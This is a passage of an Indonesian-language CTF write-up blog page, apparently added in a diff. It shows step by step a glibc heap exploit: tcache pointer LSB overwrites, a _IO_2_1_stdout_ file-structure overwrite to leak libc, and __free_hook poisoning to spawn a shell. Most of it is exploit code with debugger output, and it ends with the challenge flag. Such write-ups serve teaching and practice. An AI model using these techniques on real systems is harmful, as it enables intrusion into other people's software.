+<span class="n">unsubscribe</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+<span class="c1"># tcachebins</span>
+<span class="c1"># 0x60 [  2]: 0x555555559360 —▸ 0x5555555592a0 ◂— 0x0</span>
+</code></pre></div><p>Kondisi ketiga chunks,</p>
+<pre aria-label="Box containing code sample." tabindex=0><code>  0x555555559290:   0x0000000000000000  0x0000000000000061 &lt;-- heap_struct of chunks[0] (free`d)
+  0x5555555592a0:   0x0000000000000000  0x0000555555559010 &lt;-- tcachebins[0x60][1/2]
+  0x5555555592b0:   0x0000000000000000  0x0000000000000000
+  0x5555555592c0:   0x0000000000000000  0x0000000000000000
+  0x5555555592d0:   0x0000000000000000  0x0000000000000000
+  0x5555555592e0:   0x0000000000000000  0x0000000000000000
+  0x5555555592f0:   0x0000000000000000  0x0000000000000061 &lt;-- heap_struct of chunks[1]
+  0x555555559300:   0x0000000000000000  0x0000000000000000
+  0x555555559310:   0x0000000000000000  0x0000000000000000
+  0x555555559320:   0x0000000000000000  0x0000000000000000
+  0x555555559330:   0x0000000000000000  0x0000000000000000
+  0x555555559340:   0x0000000000000000  0x0000000000000000
+  0x555555559350:   0x0000000000000000  0x0000000000000061 &lt;-- heap_struct of chunks[2] (free`d)
+  0x555555559360:   0x00005555555592a0  0x0000555555559010 &lt;-- tcachebins[0x60][0/2]
+  0x555555559370:   0x0000000000000000  0x0000000000000000
+  0x555555559380:   0x0000000000000000  0x0000000000000000
+  0x555555559390:   0x0000000000000000  0x0000000000000000
+  0x5555555593a0:   0x0000000000000000  0x0000000000000000
+  0x5555555593b0:   0x0000000000000000  0x0000000000020c91 &lt;-- top_chunk
+</code></pre><p>Terlihat bahwa <code>chunks_size</code> dari chunks[1] terdapat pada alamat <code>0x5555555592f0</code>. Ini hanya berbeda 1 byte LSB dengan FD pointer chunks[2] <code>0x00005555555592a0</code>. Yang diperlukan hanya mengedit LSB FD pointer chunks[2] ini ke <code>0xf8</code>.</p>
+<div class="highlight"><pre class="chroma" aria-label="Box containing code sample." tabindex=0><code class="language-py" data-lang="py"><span class="n">modify</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xf8</span><span class="s1">&#39;</span><span class="p">)</span>
+
+<span class="c1"># tcachebins</span>
+<span class="c1"># 0x60 [  2]: 0x555555559360 —▸ 0x5555555592f8 ◂— 0x61 /* &#39;a&#39; */</span>
+</code></pre></div><p>Sekarang siapkan chunks padding untuk chunks size besar nanti,</p>
+<div class="highlight"><pre class="chroma" aria-label="Box containing code sample." tabindex=0><code class="language-py" data-lang="py"><span class="n">subscribe</span><span class="p">()</span> <span class="c1"># 0</span>
+<span class="n">subscribe</span><span class="p">()</span> <span class="c1"># 2 -&gt; points to chunks[1]&#39;s size</span>
+
+<span class="c1"># chunk data for chunks_size 0x420</span>
+<span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">9</span><span class="p">):</span>
+    <span class="n">subscribe</span><span class="p">()</span>
+
+<span class="c1"># for top chunk</span>
+<span class="n">subscribe</span><span class="p">()</span>
+</code></pre></div><p>Edit size dari chunks[1] tadi menjadi <code>0x421</code> dan lakukan free, agar masuk ke <code>unsortedbins</code>.</p>
+<div class="highlight"><pre class="chroma" aria-label="Box containing code sample." tabindex=0><code class="language-py" data-lang="py"><span class="n">modify</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x421</span><span class="p">))</span>
+<span class="n">unsubscribe</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="c1"># unsortedbin</span>
+<span class="c1"># all: 0x5555555592f0 —▸ 0x7ffff7fbabe0 (main_arena+96) ◂— 0x5555555592f0</span>
+</code></pre></div><p>Sekarang siapkan chunks yang berdekatan, untuk men-corrupt <code>tcachebins</code> agar menunjuk ke <code>_IO_2_1_stdout_</code>.</p>
+<div class="highlight"><pre class="chroma" aria-label="Box containing code sample." tabindex=0><code class="language-py" data-lang="py"><span class="c1"># idx: 0 - 1 - 14 - 15 - 16</span>
+<span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
+    <span class="n">subscribe</span><span class="p">()</span> 
+
+<span class="c1"># LSB OF _IO_2_1_stdout_</span>
+<span class="n">modify</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xa0\xb6</span><span class="s1">&#39;</span><span class="p">)</span>
+
+<span class="c1"># pwndbg&gt; dq 0x555555559480-0x10</span>
+<span class="c1"># 0000555555559470     0000000000000000 0000000000000061</span>
+<span class="c1"># 0000555555559480     00007ffff7fbb6a0 00007ffff7fbabe0</span>
+<span class="c1">#                                    ^^ our chunk target</span>
+<span class="c1"># 0000555555559490     0000000000000000 0000000000000000</span>
+<span class="c1"># 00005555555594a0     0000000000000000 0000000000000000</span>
+</code></pre></div><p>Aku memilih chunks[16] menjadi target aku untuk <code>_IO_2_1_stdout_</code>. Lalu siapkan free`d chunks yang berdekatan, agar chunks target dan salah FD pointer yang ada di <code>tcachabins list</code> hanya berbeda 1 byte saja di LSB-nya, sehingga bisa kita overwrite agar menunjuk ke target.</p>
+<div class="highlight"><pre class="chroma" aria-label="Box containing code sample." tabindex=0><code class="language-py" data-lang="py"><span class="n">unsubscribe</span><span class="p">(</span><span class="mi">14</span><span class="p">)</span>
+<span class="n">unsubscribe</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
+<span class="n">unsubscribe</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="c1"># tcachebins</span>
+<span class="c1"># 0x60 [  3]: 0x555555559300 —▸ 0x555555559420 —▸ 0x5555555593c0 ◂— 0x61 /* &#39;a&#39; */</span>
+</code></pre></div><p>FD Pointer dari chunks[1] yang menunjuk ke <code>0x555555559420</code> hanya berbeda 1 byte LSB-nya saja dengan chunk target kita yang berada di <code>0000555555559480</code>. Dengan mengubah 1 byte LSB dari chunks[1] menjadi <code>0x80</code>, <code>tcachebins</code> akan menunjuk ke chunk target kita.</p>
+<div class="highlight"><pre class="chroma" aria-label="Box containing code sample." tabindex=0><code class="language-py" data-lang="py"><span class="n">modify</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x80</span><span class="s1">&#39;</span><span class="p">)</span>
+
+<span class="c1"># tcachebins</span>
+<span class="c1"># 0x60 [  3]: 0x555555559300 —▸ 0x555555559480 —▸ 0x7ffff7fbb6a0 (_IO_2_1_stdout_) ◂— 0xfbad2887</span>
+</code></pre></div><p>Note, saya mematikan ASLR untuk mempermudah melakukan debugging.</p>
+<p>Sekarang, overwrite file struct <code>_IO_2_1_stdout_</code> agar mencetak suatu alamat libc. Dengan mengoverwite 1 byte LSB dari <code>_IO_write_base</code> ke suatu alamat yang menyimpan alamat libc.</p>
+<div class="highlight"><pre class="chroma" aria-label="Box containing code sample." tabindex=0><code class="language-py" data-lang="py"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
+    <span class="n">subscribe</span><span class="p">()</span>
+
+<span class="n">fake_struct</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad1800</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x08</span><span class="s1">&#39;</span>
+<span class="n">modify</span><span class="p">(</span><span class="mi">15</span><span class="p">,</span> <span class="n">fake_struct</span><span class="p">)</span>
+</code></pre></div><p>Ketika <code>_IO_2_1_stdout_</code> berhasil dioverwrite, maka program akan mengoutputkan suatu memory yang ditunjuk oleh <code>_IO_write_base</code> dan bisa dikalkulasi untuk mendapat libc leak.</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+    <img
+      
+      loading="lazy"
+      src="../images/leak.png"
+      alt="leak"
+    />
+
+  
+
+</p>
+<p>Karena leak sudah didapat, tinggal <code>tcache-poisoning</code> seperti biasa. Overwrite <code>__free_hook</code> menjadi <code>system</code>. Free chunk yang menyimpan string <code>/bin/sh</code> untuk dapat RCE !</p>
+<div class="highlight"><pre class="chroma" aria-label="Box containing code sample." tabindex=0><code class="language-py" data-lang="py"><span class="n">unsubscribe</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span>
+<span class="n">unsubscribe</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span>
+
+<span class="n">modify</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]))</span>
+
+<span class="c1"># tcachebins</span>
+<span class="c1"># 0x60 [  2]: 0x555555559720 —▸ 0x7ffff7fbdb28 (__free_hook) ◂— 0x0</span>
+
+<span class="n">subscribe</span><span class="p">()</span>
+<span class="n">subscribe</span><span class="p">()</span>
+
+<span class="n">modify</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]))</span>
+
+<span class="c1"># pwndbg&gt; tel &amp;__free_hook 1</span>
+<span class="c1"># 00:0000│   0x7ffff7fbdb28 (__free_hook) —▸ 0x7ffff7e24410 (system) ◂— endbr64 </span>
+
+<span class="n">modify</span><span class="p">(</span><span class="mi">13</span><span class="p">,</span> <span class="s1">&#39;/bin/sh</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">unsubscribe</span><span class="p">(</span><span class="mi">13</span><span class="p">)</span>
+</code></pre></div><p>Tambahkan <code>try except</code> untuk otomasi bruteforce.</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+    <img
+      
+      loading="lazy"
+      src="../images/test.png"
+      alt="leak"
+    />
+
+  
+
+</p>
+
+
+
+
+
+  <h2 id="flag-3"><a class="anchor" href="#flag-3" title='Anchor for "Flag".'><svg aria-hidden="true"><use xlink:href="#hashtag"/></svg></a> Flag</h2> 
+
+<pre aria-label="Box containing code sample." tabindex=0><code>flag{welcome_you_are_now_one_of_us_4d2d08c6994188b642a854194916fbbc}
+</code></pre><p>Nice challanges!</p>
+
+
+
+
+
+  <h1 id="references">References</h1> 
+
+<ul>
+<li><a href="http://blog.rh0gue.com/2017-12-31-34c3ctf-300/">http://blog.rh0gue.com/2017-12-31-34c3ctf-300/</a></li>
+<li><a href="https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/">https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/</a></li>
+<li><a href="https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique">https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique</a></li>
+<li><a href="https://znqt.github.io/hitcon2018-babytcache/">https://znqt.github.io/hitcon2018-babytcache/</a></li>
+</ul>
+
+
+
+    </article>
+  </main>
+
+
+    </div>
+    
+    <footer>
+      
+
+  
+    <p>Copyright © 2021, Amadeus Team and the Hugo Authors
+All rights reserved.</p>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="req-js">
+  <button class="outline-dashed" title="Change to light/dark mode."><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><use xlink:href="#adjust"/></svg></button><input class="outline-dashed" type="color" list="presets" value="#dd587c" title="Change accent color." aria-label="Change accent color."><datalist id="presets"><option value="#e0e0e0"><option value="#dd587c"><option value="#f3a530"><option value="#902b37"><option value="#1dbc91"><option value="#754e85"><option value="#7fc121"><option value="#a8314a"><option value="#ff7433"><option value="#3e6728"><option value="#c063bd"></datalist>
+</section>
+
+
+
+  <noscript>
+    <p class="noscript">Unable to execute JavaScript. Some features were disabled.</p>
+  </noscript>
+
+
+
+    </footer>
+    
+    <svg xmlns="http://www.w3.org/2000/svg" width="0" height="0" aria-hidden="true">
+      <symbol viewBox="0 0 512 512" id="adjust">
+        <path d="M8 256c0 136.966 111.033 248 248 248s248-111.034 248-248S392.966 8 256 8 8 119.033 8 256zm248 184V72c101.705 0 184 82.311 184 184 0 101.705-82.311 184-184 184z"/>
+      </symbol>
+      
+      
+      
+      
+  
+<symbol viewBox="0 0 448 512" id="hashtag">
+  <path d="M440.667 182.109l7.143-40c1.313-7.355-4.342-14.109-11.813-14.109h-74.81l14.623-81.891C377.123 38.754 371.468 32 363.997 32h-40.632a12 12 0 0 0-11.813 9.891L296.175 128H197.54l14.623-81.891C213.477 38.754 207.822 32 200.35 32h-40.632a12 12 0 0 0-11.813 9.891L132.528 128H53.432a12 12 0 0 0-11.813 9.891l-7.143 40C33.163 185.246 38.818 192 46.289 192h74.81L98.242 320H19.146a12 12 0 0 0-11.813 9.891l-7.143 40C-1.123 377.246 4.532 384 12.003 384h74.81L72.19 465.891C70.877 473.246 76.532 480 84.003 480h40.632a12 12 0 0 0 11.813-9.891L151.826 384h98.634l-14.623 81.891C234.523 473.246 240.178 480 247.65 480h40.632a12 12 0 0 0 11.813-9.891L315.472 384h79.096a12 12 0 0 0 11.813-9.891l7.143-40c1.313-7.355-4.342-14.109-11.813-14.109h-74.81l22.857-128h79.096a12 12 0 0 0 11.813-9.891zM261.889 320h-98.634l22.857-128h98.634l-22.857 128z"/>
+</symbol>
+
+
+  <symbol viewBox="0 0 320 512" id="caret-down">
+    <path d="M31.3 192h257.3c17.8 0 26.7 21.5 14.1 34.1L174.1 354.8c-7.8 7.8-20.5 7.8-28.3 0L17.2 226.1C4.6 213.5 13.5 192 31.3 192z"/>
+  </symbol>
+
+
+      
+      
+      
+    </svg>
+
+    
+    
+    
+
+      <script>
+        
+          'use strict';const PALETTE=document.querySelector('footer input');PALETTE.onchange=function(){const PICK=PALETTE.value;SHEET.setProperty('--accent',PICK);if(ROOT.dataset.mode==='light'){localStorage.setItem('lightAccent',PICK)}else{localStorage.setItem('darkAccent',PICK)};updateAccent()};
+        
+      </script>
+
+    
+    
+    
+    
+
+  </body>
+</html>
